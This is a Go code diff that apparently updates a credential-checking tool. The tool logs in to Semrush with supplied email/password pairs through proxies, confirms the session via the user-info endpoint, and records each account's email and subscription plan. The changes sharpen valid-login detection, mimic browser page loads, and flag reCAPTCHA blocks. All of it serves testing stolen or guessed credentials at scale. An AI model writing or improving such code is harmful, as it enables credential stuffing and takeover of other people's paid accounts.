@@ -113,7 +113,7 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 		"password":              password,
 	}
 	authJSON, _ := json.Marshal(authPayload)
-	authBody, authStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushAuthorizeURL(), map[string]string{
+	authBody, authStatus, authHeaders, err := c.doRequest(client, "POST", c.cfg.SemrushAuthorizeURL(), map[string]string{
 		"Accept":       "application/json, text/plain, */*",
 		"Content-Type": "application/json",
 		"Origin":       c.cfg.BaseURL(),
@@ -142,15 +142,32 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 		}
 		return result
 	}
-	if !semrushAuthSucceeded(authBody, authStatus) {
+	if semrushAuthBodyIndicatesFailure(authBody) {
+		result.Status = StatusFail
+		result.Reason = semrushAuthFailureReason(authBody, "invalid email or password")
+		return result
+	}
+	if authStatus < 200 || authStatus >= 300 {
 		result.Status = StatusFail
 		result.Reason = fmt.Sprintf("login failed (HTTP %d)", authStatus)
 		return result
 	}
 
-	result.AccountEmail = email
-	if plan, ok := extractSemrushPlanFromJSON(authBody); ok {
-		result.PlanName = plan
+	c.followSemrushPostAuth(client, authBody, authHeaders)
+
+	verified, accountEmail, verifyReason := c.verifySemrushAuthenticated(client)
+	if !verified {
+		result.Status = StatusFail
+		if verifyReason == "" {
+			verifyReason = "invalid email or password"
+		}
+		result.Reason = verifyReason
+		return result
+	}
+
+	result.AccountEmail = accountEmail
+	if result.AccountEmail == "" {
+		result.AccountEmail = email
 	}
 
 	// Step 5: subscription header API (from ONF capture — Profile → Subscription Info)
@@ -188,6 +205,90 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 	return result
 }
 
+func (c *Checker) followSemrushPostAuth(client *http.Client, authBody string, authHeaders http.Header) {
+	headers := map[string]string{
+		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"User-Agent": c.cfg.UserAgent,
+	}
+	base := c.cfg.BaseURL()
+	var urls []string
+	if loc := authHeaders.Get("Location"); loc != "" {
+		urls = append(urls, loc)
+	}
+	for _, key := range []string{"redirect", "redirect_to", "redirectUrl"} {
+		if u, ok := jsonPathString(authBody, key); ok && u != "" {
+			urls = append(urls, u)
+		}
+	}
+	seen := map[string]struct{}{}
+	for _, u := range urls {
+		if !strings.HasPrefix(u, "http") {
+			if strings.HasPrefix(u, "/") {
+				u = base + u
+			} else {
+				u = base + "/" + u
+			}
+		}
+		if _, ok := seen[u]; ok {
+			continue
+		}
+		seen[u] = struct{}{}
+		_, _, _, _ = c.doRequest(client, "GET", u, headers, "")
+	}
+}
+
+func (c *Checker) verifySemrushAuthenticated(client *http.Client) (bool, string, string) {
+	userInfoURL := c.cfg.Var("user_info_url", c.cfg.BaseURL()+"/accounts/user-info")
+	headers := map[string]string{
+		"Accept":     "application/json, text/plain, */*",
+		"Referer":    c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/"),
+		"User-Agent": c.cfg.UserAgent,
+	}
+	body, status, _, err := c.doRequest(client, "GET", userInfoURL, headers, "")
+	if err != nil {
+		return false, "", err.Error()
+	}
+	if status == http.StatusUnauthorized || status == http.StatusForbidden {
+		return false, "", "invalid email or password"
+	}
+	if status != http.StatusOK {
+		return false, "", fmt.Sprintf("not authenticated (user-info HTTP %d)", status)
+	}
+	email, _ := jsonPathString(body, "email")
+	id, _ := jsonPathString(body, "id")
+	if email == "" && id == "" {
+		return false, "", "invalid email or password"
+	}
+	if activated, ok := jsonPathString(body, "activated"); ok && activated == "false" {
+		return false, "", "account not activated"
+	}
+	return true, email, ""
+}
+
+func semrushAuthBodyIndicatesFailure(body string) bool {
+	if success, ok := jsonPathString(body, "success"); ok && success == "false" {
+		return true
+	}
+	if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "false" {
+		return true
+	}
+	code := semrushErrorCode(body)
+	if strings.HasPrefix(code, "ERROR") {
+		return true
+	}
+	return semrushAuthFailureReason(body, "") != ""
+}
+
+func semrushAuthFailureReason(body, fallback string) string {
+	if reason := parseSemrushAuthFailure(body, 0); reason != "" && reason != "recaptcha_required" {
+		return reason
+	}
+	if fallback != "" {
+		return fallback
+	}
+	return "invalid email or password"
+}
+
 func (c *Checker) fetchSemrushSubscriptionPlan(client *http.Client) (string, bool) {
 	subReferer := c.cfg.Var("subscription_page_url", c.cfg.BaseURL()+"/accounts/subscription-info/")
 	apiHeaders := map[string]string{
@@ -195,6 +296,13 @@ func (c *Checker) fetchSemrushSubscriptionPlan(client *http.Client) (string, boo
 		"Referer":    subReferer,
 		"User-Agent": c.cfg.UserAgent,
 	}
+
+	// Warm subscription session (browser loads this page before XHR calls).
+	_, _, _, _ = c.doRequest(client, "GET", subReferer, map[string]string{
+		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Referer":    c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/"),
+		"User-Agent": c.cfg.UserAgent,
+	}, "")
 
 	headerURL := c.cfg.AccountQueryURL()
 	headerBody, headerStatus, _, err := c.doRequest(client, "GET", headerURL, apiHeaders, "")
@@ -347,6 +455,7 @@ func parseSemrushAuthFailure(body string, status int) string {
 	}
 
 	failPhrases := map[string]string{
+		"wrong login or password":     "invalid email or password",
 		"invalid email or password":   "invalid email or password",
 		"incorrect email or password": "invalid email or password",
 		"wrong password":              "invalid email or password",
@@ -364,7 +473,7 @@ func parseSemrushAuthFailure(body string, status int) string {
 	if status == http.StatusUnauthorized || status == http.StatusForbidden {
 		return "invalid email or password"
 	}
-	if status == http.StatusBadRequest {
+	if status == http.StatusBadRequest || status == http.StatusUnprocessableEntity {
 		if semrushResponseNeedsRecaptcha(body) {
 			return "recaptcha_required"
 		}
@@ -372,6 +481,7 @@ func parseSemrushAuthFailure(body string, status int) string {
 			return msg
 		}
 	}
+	// Some Semrush error payloads still return HTTP 2xx — body text already scanned above.
 	return ""
 }
 
@@ -379,8 +489,7 @@ func semrushAuthSucceeded(body string, status int) bool {
 	if status < 200 || status >= 300 {
 		return false
 	}
-	code := semrushErrorCode(body)
-	if strings.HasPrefix(code, "ERROR") {
+	if semrushAuthBodyIndicatesFailure(body) {
 		return false
 	}
 	if redirect, ok := jsonPathString(body, "redirect"); ok && redirect != "" {
@@ -398,14 +507,8 @@ func semrushAuthSucceeded(body string, status int) bool {
 	if success, ok := jsonPathString(body, "success"); ok && success == "true" {
 		return true
 	}
-	trimmed := strings.TrimSpace(body)
-	if trimmed == "" || trimmed == "{}" {
-		return status == http.StatusOK || status == http.StatusCreated || status == http.StatusNoContent
-	}
-	if strings.HasPrefix(trimmed, "{") {
-		return !strings.Contains(strings.ToLower(trimmed), `"error"`)
-	}
-	return true
+	// Empty authorize body is not proof of login — caller must verify session separately.
+	return false
 }
 
 func extractSemrushPlanFromJSON(body string) (string, bool) {
